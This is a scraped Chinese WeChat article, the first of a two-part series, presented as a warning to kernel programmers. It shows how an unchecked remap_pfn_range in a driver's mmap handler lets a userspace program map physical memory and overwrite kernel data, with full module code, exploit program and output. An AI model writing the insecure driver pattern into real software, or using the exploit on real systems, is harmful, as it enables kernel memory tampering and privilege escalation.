@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<head>
+	<meta http-equiv='Content-Type' content='text/html;charset=utf-8'>
+	<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no'>
+	<title>
+		怎样在Linux内核中埋炸弹获取root权限&lt;1-2&gt;
+	</title>
+	<script src='https://cdn.bootcss.com/jquery/1.10.2/jquery.min.js'>
+	</script>
+	<style>
+		a {color: #607fa6;text-decoration:none;word-wrap:break-word;word-break:break-all;}.rich_media_title{padding-bottom:10px;margin-bottom:14px;border-bottom:1px solid #e7e7eb;font-weight:400;} .rich_media_meta_list{font-size:14px;margin-bottom: 22px;}
+		.rich_media_meta{display:inline-block;vertical-align:middle;margin-right:8px;margin-bottom:10px;font-size:14px;}.rich_media_meta_text{color:#8c8c8c;color:rgba(0, 0, 0, 0.3)}.rich_media_meta_list
+		em {font-style: normal;}@media screen and (max-width:768px){.rich_media{position:
+		relative;padding: 20px 15px 15px;background-color: #fff;}}.rich_media_content{text-align:justify;} .rich_media_content * {max-width:100%!important;box-sizing: border-box!important;-webkit-box-sizing:
+		border-box!important;word-wrap: break-word!important;}.rich_media_content
+		blockquote {margin: 0;padding-left: 10px;border-left: 3px solid #dbdbdb;}.rich_media_content
+		.list-paddingleft-2 {padding-left: 2.2em;}a.rich_media_meta_nickname{display: none;}@media screen and (min-width:1025px){.rich_media{position:relative;}a.rich_media_meta_nickname{display:inline-block!important;}span.rich_media_meta_nickname
+		{display: inline-block!important;}.rich_media {width:677px;margin-left:auto;margin-right:auto;}}a.fwjm{font-size: 12px;color: #ececec;}.tenvideo_player {position: relative;width:
+		100 %;height: 100 %;margin: auto;background: #000;}* {margin:0px;padding:0px;} body{line-height: 1.6;letter-spacing: .034em;}
+		.dy_all {text-align: center;margin: 30px 0;} .dy_all a {display: inline-block;height:
+		38px;line-height: 38px;padding: 0 18px;background-color: #009688;color:
+		#fff;white-space: nowrap;font-size: 14px;border: none;border-radius: 2px;cursor:
+		pointer;text-align: center;outline: 0;-webkit-appearance: none;transition:
+		all .3s;-webkit-transition: all .3s;box-sizing: border-box;} img{max-width: 677px!important;}
+
+		.crawler-info{padding: 8px 0;} .article-link>img{margin-left: 20px;width: 16px;}
+		.comment-item::before,.comment-item::after{content:'';display:block;height:0;visibility:hidden;clear:both;*zoom:1;} .comment-item{margin-bottom:30px;}
+		.avatar{width:12%; padding-right:10px;float:left;box-sizing:border-box;} .avatar img{width:100%;}
+		.comment-body{float:left;width:88%;} .comment-body .comment-info{color:#b3b3b3;margin-bottom:4px;margin-top: -5px;} .comment-body .comment-info>span:last-child{float:right;} 
+		.comment-author{border-left:4px solid green;padding-left:6px;margin:8px 0;}
+
+		@media screen and (max-width: 420px) {.article-link>img {margin-left: 0px;}}
+		@media screen and (min-width: 480px) {.avatar {width: 9%;}.comment-body {width: 91%;}}
+	</style>
+</head>
+<body>
+	<div id='js_article' class='rich_media'>
+		<div class="crawler-info">
+			<a href='https://www.52pojie.cn' class='fwjm' target='_blank'>
+				提供的爬取软件来源于：52pojie.cn@夜泉 免费下载使用
+			</a>
+			<a href='https://mp.weixin.qq.com/s?__biz=MzI3NzA5MzUxNA==&amp;mid=2664606716&amp;idx=1&amp;sn=66a71e97992658a189ce197ca917451c&amp;chksm=f04d8619c73a0f0f86587d6025d43391a0fcd563b04daa25d2607601e99461512a0dbe6fcc48&amp;scene=27#wechat_redirect&cpage=1' target='_blank' class="article-link">
+				<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAQCAMAAABA3o1rAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyZpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQ1IDc5LjE2MzQ5OSwgMjAxOC8wOC8xMy0xNjo0MDoyMiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTkgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOjk4QUEzQzVDNkNGQjExRTk5NzNBQ0VBMjgzMjY1NjkwIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOjk4QUEzQzVENkNGQjExRTk5NzNBQ0VBMjgzMjY1NjkwIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6OThBQTNDNUE2Q0ZCMTFFOTk3M0FDRUEyODMyNjU2OTAiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6OThBQTNDNUI2Q0ZCMTFFOTk3M0FDRUEyODMyNjU2OTAiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5TKSKsAAAAclBMVEUuLi77+/stLS1VVVXx8fFOTk7s7Ozt7e1qamp5eXlNTU2WlpZFRUU6Ojrq6urn5+d/f3/8/Pw9PT0/Pz+YmJg8PDyZmZlAQECfn5+QkJBBQUFra2vo6OhDQ0OSkpKenp5WVlY+Pj7r6+tpaWksLCz///9o6ILHAAAAJnRSTlP/////////////////////////////////////////////////AKd6gbwAAACNSURBVHjajJHpEoIwDISDVMotcnuCmLz/K9KCdlqO6v7p7Mw3yW4KxG85fnUkIVfZ5J0SsCtqcgRw0HzjQYY2AAOIdRuaK4ReAPJ5nmglL5qICahpU60C0uXguQ9TgIwGJoDnT9z/ABmxt60ot0N2CsDLfb9mvBxs9ql+n5o9bEDBgbif7/1F4g80CjAAqrVAnnsm5f8AAAAASUVORK5CYII=" />
+			</a>
+		</div>
+		<div id="img-content">
+
+                
+                <h2 class="rich_media_title" id="activity-name">怎样在Linux内核中埋炸弹获取root权限&lt;1/2&gt;</h2>
+                <div id="meta_content" class="rich_media_meta_list">
+                                                                                                                            
+                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt"><a href="javascript:void(0);">Linux内核之旅</a>
+                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
+                          <div class="profile_inner">
+                              <strong class="profile_nickname">Linux内核之旅</strong>
+                              <img class="profile_avatar" id="js_profile_qrcode_img" src="" alt="">
+
+                              <p class="profile_meta">
+                              <label class="profile_meta_label">微信号</label>
+                              <span class="profile_meta_value">LinuxKernelTravel</span>
+                              </p>
+
+                              <p class="profile_meta">
+                              <label class="profile_meta_label">功能介绍</label>
+                              <span class="profile_meta_value">Linux内核之旅</span>
+                              </p>
+                              
+                          </div>
+                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
+                              <i class="profile_arrow arrow_out"></i>
+                              <i class="profile_arrow arrow_in"></i>
+                          </span>
+                      </div>
+                    </span>
+
+
+                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2019-07-24</em>
+
+
+
+
+
+                </div>
+
+                
+                
+                                <a class="original_area_primary" id="copyright_info" href="##" style="visibility:hidden">
+                    <span class="tips_global_primary">文章转载自公众号</span>
+                    <span class="radius_avatar">
+                                            <img class="avatar" src="http://wx.qlogo.cn/mmhead/Q3auHgzwzM5xicOAr84Aiaol5dSXdBgP668gR4hovaLZEGrwyqLICkww/0" alt="相遇Linux">
+                                          </span>
+                    <span class="original_primary_nickname rich_media_meta_link js_nickname">相遇Linux</span>
+                                        <span class="tips_global_primary" id="js_comma">，</span>
+                    <span class="original_primary_author_wrp tips_global_primary" id="js_author">
+                      作者                                            JeffXie
+                                          </span>
+                                    </a>
+                                
+                
+                
+                
+                                                
+                                                                
+                                
+                
+                <div class="rich_media_content " id="js_content">
+                    
+
+                    
+
+                    
+                    
+                    <p>首先申明，我是一个好人，nice值至少为0.本文章的目的是提醒程序员在编程中注意，以免让nice值很低的人为所欲为。本系列文章分为两篇，第一篇说明基本原理，第二篇是重头戏。<br  /></p><p><br  /></p><p><strong><span style="font-size: 20px;">怎样在linux内核中任意践踏内存内容：</span></strong></p><p>在内核驱动中经常会看到这样的代码:</p><p><br  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="swift"><code><span class="code-snippet_outer"><span class="code-snippet__keyword">static</span> <span class="code-snippet__class"><span class="code-snippet__keyword">struct</span> <span class="code-snippet__title">file_operations</span> <span class="code-snippet__title">mmap_fops</span> =</span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">        .<span class="code-snippet__keyword">open</span> = dev_open,</span></code><code><span class="code-snippet_outer">        .mmap = simple_mmap,</span></code><code><span class="code-snippet_outer">        .release = dev_release,</span></code><code><span class="code-snippet_outer">};</span></code></pre></section><p>simple_mmap就是在内核中给应用层提供的对应的mmap接口函数。<br  /></p><p>在像simple_mmap类似函数里面经常会调用remap_pfn_range</p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="cpp"><code><span class="code-snippet_outer"><span class="code-snippet__comment">/**</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"> * remap_pfn_range - remap kernel memory to userspace</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"> * @vma: user vma to map to</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"> * @addr: target user address to start at</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"> * @pfn: physical address of kernel memory</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"> * @size: size of map area</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"> * @prot: page protection flags for this mapping</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"> *</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"> *  Note: this is only safe if the mm semaphore is held when called.</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__comment"> */</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__function"><span class="code-snippet__keyword">int</span> <span class="code-snippet__title">remap_pfn_range</span><span class="code-snippet__params">(struct vm_area_struct *vma, <span class="code-snippet__keyword">unsigned</span> <span class="code-snippet__keyword">long</span> addr,</span></span></span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">unsigned</span> <span class="code-snippet__keyword">long</span> pfn, <span class="code-snippet__keyword">unsigned</span> <span class="code-snippet__keyword">long</span> size, <span class="code-snippet__keyword">pgprot_t</span> prot)</span></code></pre></section><p>这个函数的功能就是把一段虚拟地址映射到内核中的一段物理地址。<br  /></p><p><br  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="php"><code><span class="code-snippet_outer"><span class="code-snippet__keyword">static</span> int simple_mmap (struct file *filp, struct vm_area_struct *vma)</span></code><code><span class="code-snippet_outer">{       </span></code><code><span class="code-snippet_outer">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printk(KERN_INFO&nbsp;<span class="code-snippet__string">"Jeff:&nbsp;device&nbsp;mmap.\n"</span>);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">if</span> (remap_pfn_range(vma, vma-&gt;vm_start, vma-&gt;vm_pgoff,</span></code><code><span class="code-snippet_outer">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vma-&gt;vm_end&nbsp;-&nbsp;vma-&gt;vm_start,&nbsp;vma-&gt;vm_page_prot)</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">}</span></code></pre></section><p>比如有的人疯了一样像上面这样写代码，这样就有些放飞自我了，这样就不做任何判断的把一段虚拟地址映射到内核中的任意物理地址。<br  /></p><p><br  /></p><p>我们现在利用上面的漏洞代码来修改任意一段指定的内存。</p><p><br  /></p><p><strong>实验开始：</strong></p><p>首先写一个小模块：kmalloc.ko<br  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="cpp"><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;linux/module.h&gt;</span></span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;linux/init.h&gt;</span></span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__meta">#<span class="code-snippet__meta-keyword">include</span> <span class="code-snippet__meta-string">&lt;linux/slab.h&gt;</span></span></span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">static</span> <span class="code-snippet__keyword">char</span> *p;</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">static</span> __<span class="code-snippet__function">init <span class="code-snippet__keyword">int</span> <span class="code-snippet__title">init_kmalloc</span><span class="code-snippet__params">(<span class="code-snippet__keyword">void</span>)</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">        p = kmalloc(<span class="code-snippet__number">20</span>, GFP_KERNEL);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">if</span> (!p)</span></code><code><span class="code-snippet_outer">                <span class="code-snippet__keyword">return</span> <span class="code-snippet__number">-1</span>; </span></code><code><span class="code-snippet_outer">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span class="code-snippet__built_in">strcpy</span>(p,&nbsp;<span class="code-snippet__string">"jeffnice+20"</span>);</span></code><code><span class="code-snippet_outer">        printk(KERN_INFO <span class="code-snippet__string">"phy:0x%llx\n"</span>, virt_to_phys(p));</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">return</span> <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">static</span> <span class="code-snippet__keyword">void</span> __<span class="code-snippet__function"><span class="code-snippet__built_in">exit</span> <span class="code-snippet__title">exit_kmalloc</span><span class="code-snippet__params">(<span class="code-snippet__keyword">void</span>)</span></span></span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">        printk(KERN_INFO <span class="code-snippet__string">"p string:%s\n"</span>, p); </span></code><code><span class="code-snippet_outer">        kfree(p);</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer">module_init(init_kmalloc);</span></code><code><span class="code-snippet_outer">module_exit(exit_kmalloc);</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">MODULE_AUTHOR(<span class="code-snippet__string">"Jeff Xie"</span>);</span></code><code><span class="code-snippet_outer">MODULE_LICENSE(<span class="code-snippet__string">"GPL"</span>);</span></code></pre></section><p>这个模块加载进内核之后，会打印出p对应的物理地址。</p><p>在卸载的时候会打印出一段字符串，很显然会打印：<span style="color: rgb(0, 209, 0);"><strong>jeffnice+20&nbsp; &nbsp;</strong></span><br  /></p><p>但是我们让它打印jeffnice+20就没有什么看头了，比如我们利用上面的<span style="font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 14px;text-align: left;white-space: pre;background-color: rgba(0, 0, 0, 0.03);">simpl</span><span style="font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 14px;text-align: left;white-space: pre;background-color: rgba(0, 0, 0, 0.03);">e_</span><span style="font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace;font-size: 14px;text-align: left;white-space: pre;background-color: rgba(0, 0, 0, 0.03);">mmap</span>函数漏洞让这个kmalloc.ko模块在卸载的时候打印：</p><p><span style="color: rgb(255, 0, 0);"><strong>jeffnice-19</strong></span>.&nbsp;</p><p>接下来见证奇迹的时刻来了。</p><p>先编译此模块，然后 insmod kmalloc.ko 看到打印出p对应的物理地址：<br  /></p><p><span style="color: rgb(255, 0, 0);">[1158297.073811] phy</span><span style="color: rgb(0, 209, 0);">:0x2adcd1e0</span><span style="color: rgb(255, 0, 0);"></span></p><p>然后编译加载带有漏洞的模块代码 mmap-root.ko：（代码有删减）<br  /></p><p><br  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="php"><code><span class="code-snippet_outer"><span class="code-snippet__comment">/* 代码有删减 */</span></span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">static</span> int simple_mmap (struct file *filp, struct vm_area_struct *vma)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;remap_pfn_range(vma,&nbsp;vma-&gt;vm_start,&nbsp;vma-&gt;vm_pgoff,</span></code><code><span class="code-snippet_outer">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;vma-&gt;vm_end&nbsp;-&nbsp;vma-&gt;vm_start,&nbsp;vma-&gt;vm_page_prot)</span></code><code><span class="code-snippet_outer">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">static</span> struct file_operations mmap_fops =</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">        .open = dev_open,</span></code><code><span class="code-snippet_outer">        .mmap = simple_mmap,</span></code><code><span class="code-snippet_outer">        .release = dev_release,</span></code><code><span class="code-snippet_outer">};</span></code><code><span class="code-snippet_outer"><span class="code-snippet__keyword">static</span> int __init cve_mmap_init(void)</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">    int err = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">&nbsp;&nbsp;&nbsp;&nbsp;pcdev&nbsp;=&nbsp;cdev_alloc();</span></code><code><span class="code-snippet_outer">    cdev_init(pcdev, &amp;mmap_fops);</span></code><code><span class="code-snippet_outer">    err = alloc_chrdev_region(&amp;ndev, <span class="code-snippet__number">0</span>, <span class="code-snippet__number">1</span>, <span class="code-snippet__string">"mmap_dev"</span>);</span></code><code><span class="code-snippet_outer">  &nbsp;&nbsp;printk(<span class="code-snippet__string">"major&nbsp;=&nbsp;%d,&nbsp;minor&nbsp;=&nbsp;%d\n"</span>,&nbsp;MAJOR(ndev),&nbsp;MINOR(ndev));</span></code><code><span class="code-snippet_outer">&nbsp;&nbsp;&nbsp;&nbsp;err&nbsp;=&nbsp;cdev_add(pcdev,&nbsp;ndev,&nbsp;<span class="code-snippet__number">1</span>)</span></code></pre></section><p>&nbsp; &nbsp; insmod mmap-root.ko</p><p>dmesg:</p><p>&nbsp;&nbsp;<strong>&nbsp;</strong><span style="color: rgb(255, 0, 0);"><strong>&nbsp;[1157207.384411] major = 245, minor = 0</strong></span></p><p>手动新建一个设备节点：</p><p>mknod&nbsp;-m&nbsp;0666&nbsp; /dev/mmap&nbsp;c&nbsp;&nbsp;245 0&nbsp;<br  /></p><p><br  /></p><p>现在万事俱备，准备写一个应用程序来干大事：<br  /></p><section class="code-snippet__fix code-snippet__js"><ul class="code-snippet__line-index code-snippet__js"><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li></ul><pre class="code-snippet__js" data-lang="cpp"><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">unsigned</span> <span class="code-snippet__keyword">long</span> mmapStart = <span class="code-snippet__number">0x57575000</span>;</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">int</span> fd = open(<span class="code-snippet__string">"/dev/mmap"</span>, O_RDWR);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">if</span> (fd &lt; <span class="code-snippet__number">0</span>)</span></code><code><span class="code-snippet_outer">        {   </span></code><code><span class="code-snippet_outer">                <span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[-] open failed.\n"</span>);</span></code><code><span class="code-snippet_outer">                <span class="code-snippet__keyword">return</span> <span class="code-snippet__number">-1</span>; </span></code><code><span class="code-snippet_outer">        }   </span></code><code><span class="code-snippet_outer">        size = <span class="code-snippet__number">0xf0000000</span>;</span></code><code><span class="code-snippet_outer">        addr = (<span class="code-snippet__keyword">unsigned</span> <span class="code-snippet__keyword">long</span> *)mmap((<span class="code-snippet__keyword">void</span>*)mmapStart, size,</span></code><code><span class="code-snippet_outer">                PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="code-snippet__number">0</span>); </span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">if</span> (addr == MAP_FAILED) {</span></code><code><span class="code-snippet_outer">                perror(<span class="code-snippet__string">"[-]failed to mmap:"</span>);</span></code><code><span class="code-snippet_outer">                close(fd);</span></code><code><span class="code-snippet_outer">                <span class="code-snippet__keyword">return</span> <span class="code-snippet__number">-1</span>; </span></code><code><span class="code-snippet_outer">        }   </span></code><code><span class="code-snippet_outer">        <span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[+]mmap ok addr : %lx\n"</span>, addr);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">while</span> (((<span class="code-snippet__keyword">unsigned</span> <span class="code-snippet__keyword">long</span>)addr) &lt; (mmapStart + size))</span></code><code><span class="code-snippet_outer">{</span></code><code><span class="code-snippet_outer">        count = <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">if</span> (</span></code><code><span class="code-snippet_outer">        addr[count++] == <span class="code-snippet__string">'j'</span> &amp;&amp;</span></code><code><span class="code-snippet_outer">        addr[count++] == <span class="code-snippet__string">'e'</span> &amp;&amp;</span></code><code><span class="code-snippet_outer">        addr[count++] == <span class="code-snippet__string">'f'</span> &amp;&amp;</span></code><code><span class="code-snippet_outer">        addr[count++] == <span class="code-snippet__string">'f'</span> &amp;&amp;</span></code><code><span class="code-snippet_outer">        addr[count++] == <span class="code-snippet__string">'n'</span> &amp;&amp;</span></code><code><span class="code-snippet_outer">        addr[count++] == <span class="code-snippet__string">'i'</span> &amp;&amp;</span></code><code><span class="code-snippet_outer">        addr[count++] == <span class="code-snippet__string">'c'</span> &amp;&amp;</span></code><code><span class="code-snippet_outer">        addr[count++] == <span class="code-snippet__string">'e'</span> </span></code><code><span class="code-snippet_outer">        ) { </span></code><code><span class="code-snippet_outer">                <span class="code-snippet__built_in">printf</span>(<span class="code-snippet__string">"[+]found addr %p phy:0x%llx.\n"</span>,</span></code><code><span class="code-snippet_outer">                       addr, (<span class="code-snippet__keyword">unsigned</span> <span class="code-snippet__keyword">long</span>)addr - mmapStart);</span></code><code><span class="code-snippet_outer">                addr[count++] = <span class="code-snippet__string">'-'</span>;</span></code><code><span class="code-snippet_outer">                addr[count++] = <span class="code-snippet__string">'1'</span>;</span></code><code><span class="code-snippet_outer">                addr[count++] = <span class="code-snippet__string">'9'</span>;</span></code><code><span class="code-snippet_outer"><br  /></span></code><code><span class="code-snippet_outer">          }   </span></code><code><span class="code-snippet_outer">                addr ++; </span></code><code><span class="code-snippet_outer">        }   </span></code><code><span class="code-snippet_outer">        close(fd);</span></code><code><span class="code-snippet_outer">        <span class="code-snippet__keyword">return</span> <span class="code-snippet__number">0</span>;</span></code><code><span class="code-snippet_outer">}</span></code><code><span class="code-snippet_outer"><br  /></span></code></pre></section><p>此程序的目的是映射虚拟地址&nbsp;0x57575000 至&nbsp;0x57575000+0xf0000000 到物理地址0x0 至&nbsp;0xf0000000</p><p>然后从系统内存中搜索对应的含有"jeffnice"的小内存块，把接下来的后三个字节换成"-19"</p><p><span style="color: rgb(255, 0, 0);">gcc ./jeff-mmap.c -o jeff-mmap</span><br  /></p><p>root@jeff:# <span style="color: rgb(255, 0, 0);">./jeff-mmap&nbsp;</span></p><p>[+]mmap ok addr : 57575000</p><p>[+]found addr 0x5969eaa9 phy:0x2129aa9.</p><p>[+]found addr 0x6969b9e9 phy:0x121269e9.</p><p>[+]found addr 0x74da91fb phy:0x1d8341fb.</p><p>[+]found addr 0x781a1d5f phy:0x20c2cd5f.</p><p>[+]found addr 0x823421e0 <span style="color: rgb(0, 209, 0);">phy:0x2adcd1e0.</span></p><p>[+]found addr 0x898e084d phy:0x3236b84d.</p><p>[+]found addr 0x90a580c4 phy:0x394e30c4.</p><p>[+]found addr 0xb857308b phy:0x60ffe08b.</p><p>[+]found addr 0xd172a092 phy:0x7a1b5092.</p><p>编译执行之后会看到在内存中找到了十个左右的内存块，都含有“jeffnice",其中有一个对应的物理内存是<span style="color: rgb(0, 209, 0);">&nbsp;0x2adcd1e0</span>,这个正是上面kmalloc.ko模块中p的物理首地址。</p><p><br  /></p><p>然后卸载kmalloc.ko模块验证字符串输出</p><p>rmmod kmalloc&nbsp;&nbsp;</p><p>从dmesg信息中看到<br  /></p><p><strong>[1158783.927631] p string:<span style="color: rgb(255, 0, 0);">jeffnice-19</span></strong></p><p>输出与预料一致。<br  /></p><p>觉得文章不错，可以点“好看”和打赏。</p><p>（完）</p>
+                </div>
+                
+
+                
+  <div class="ct_mpda_wrp" id="js_sponsor_ad_area" style="display: none;"></div>
+
+
+                
+                <div class="read-more__area" id="js_more_read_area" style="display:none;">
+                    
+                </div>
+
+                
+                                <div class="reward_area tc reward_area_primary" id="js_preview_reward_author" style="display:none;">
+                    <div class="reward-avatar" style="display: none;" id="js_preview_reward_author_avatar">
+                        <img src="" alt="" id="js_preview_reward_author_head">
+                    </div>
+                    
+                                        <div class="reward-author" id="js_preview_reward_author_name">JeffXie</div>
+                                        <p class="reward_tips" id="js_preview_reward_author_wording" style="display:none;"></p>
+                    <p class="reward_button_wrp">
+                    
+                      <span class="reward_pop_panel">
+                        <img src="https://res.wx.qq.com/mpres/zh_CN/htmledition/pages/home/index/pic_mp_app4290ba.png" alt="">
+                        <strong>扫一扫下载订阅号助手，用手机发文章</strong>
+                      </span>
+                        <a class="reward_button" id='js_preview_reward_author_link' href="##"><span id="js_preview_reward_link_text">赞赏</span></a>
+                    </p>
+                </div>
+
+                <div class="reward_qrcode_area reward_area tc" id="js_preview_reward_qrcode" style="display:none;">
+                    <p class="tips_global">长按二维码向我转账</p>
+                    <p id="js_preview_reward_ios_wording" class="reward_tips" style="display:none;"></p>
+                    <span class="reward_qrcode_img_wrp"><img class="reward_qrcode_img" src="res.wx.qq.com/mmbizwap/zh_CN/htmledition/images/pic/appmsg/pic_reward_qrcode.2x42f400.png"></span>
+                    <p class="tips_global">受苹果公司新规定影响，微信 iOS 版的赞赏功能被关闭，可通过二维码转账支持公众号。</p>
+                </div>
+                            </div>
+		<div class="comment">
+			<h3 style="margin:26px 0;font-weight:100;padding-bottom:4px;border-bottom:1px solid #ccc;">精选留言</h3>
+		    暂无...
+		</div>
+	</div>
+	<div class='dy_all'>
+		<a href='http://i.ijrou.com' target='_blank'>
+			我的博客
+		</a>
+	</div>
+</body>
